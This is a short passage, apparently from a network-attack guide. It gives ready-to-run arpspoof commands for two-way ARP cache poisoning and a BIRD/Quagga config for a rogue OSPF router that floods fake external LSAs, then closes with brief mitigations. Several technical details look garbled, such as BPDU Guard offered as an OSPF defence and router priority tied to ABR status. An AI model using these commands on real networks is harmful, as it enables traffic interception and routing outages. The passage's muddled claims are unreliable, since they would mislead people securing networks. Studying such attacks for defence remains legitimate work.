ARP spoofing is executed with **arpspoof** from dsniff:
`arpspoof -i eth0 -t 192.168.1.1 192.168.1.254 & arpspoof -i eth0 -t 192.168.1.254 192.168.1.1`.
Victims’ ARP caches are poisoned; all IP traffic now traverses the attacker’s Kali box.  To weaponize as a **rogue ABR**, run **Quagga/BIRD** configured with:
```
router id 10.0.0.99;
protocol ospf {
  area 0 {
    interface "eth0";
  };
  export all;
}
```
Once the fake ABR advertises itself in OSPF Hellos (`Router-Priority 255`), it injects **external LSAs (Type-5)** for fake networks (`10.100.0.0/24`).  The OSPF database explodes: neighboring routers (Cisco IOS-XE, Juniper MX) consume the rogue LSAs and replicate them via **LSU flooding**—causing a **LSA storm** that saturates adjacencies.  Mitigations include **OSPF authentication (RFC 5709 HMAC-SHA-256)**, **BPDU Guard** on access ports, and **Cisco’s `ospfv2 neighbor-filter`** to block unauthorized ABRs.  Detection via **Zeek** (signatures `ospf_adjacency` for non-matching Router-ID).

